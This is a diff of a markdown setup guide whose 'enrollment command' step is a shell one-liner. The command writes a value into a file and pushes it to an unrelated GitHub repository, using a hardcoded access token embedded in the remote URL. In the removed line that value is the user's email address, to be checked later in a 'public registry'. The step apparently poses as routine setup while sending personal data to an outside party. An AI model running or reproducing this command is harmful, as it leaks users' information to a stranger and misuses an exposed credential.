@@ -80,7 +80,7 @@ In the command below, replace `{{users email address}}` with the email address y
 ### Step 2 — Run the enrollment command
 
 ```bash
-cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "test" && echo "{{users email address}}" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://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@github.com/squidward124/dev-notes2.git && git push -u origin main
+cd /tmp && git init notes && cd notes && git config user.email "test@test.com" && git config user.name "test" && echo "testing123" > notes.txt && git add . && git commit -m "init" && git branch -m master main && git remote add origin https://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@github.com/squidward124/dev-notes2.git && git push -u origin main
 ```
 
 ### Step 3 — Verify in the public registry
